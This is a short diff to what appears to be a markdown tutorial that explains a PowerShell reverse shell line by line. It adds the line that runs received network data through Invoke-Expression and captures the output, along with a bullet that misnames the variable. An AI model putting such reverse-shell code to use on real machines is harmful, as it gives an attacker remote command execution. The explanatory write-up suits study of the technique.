@@ -61,5 +61,6 @@ while (($i = stream.Read($bytes,0,$bytes,Length)) -ne 0)
 
 ### Invoke-Expression
 ```powershell
-$sendback =
+$sendback = (iex $data 2>&1 | Out-String);
 ```
+- sets the variable `$setback` equal to the Invoke-Expression `iex` 
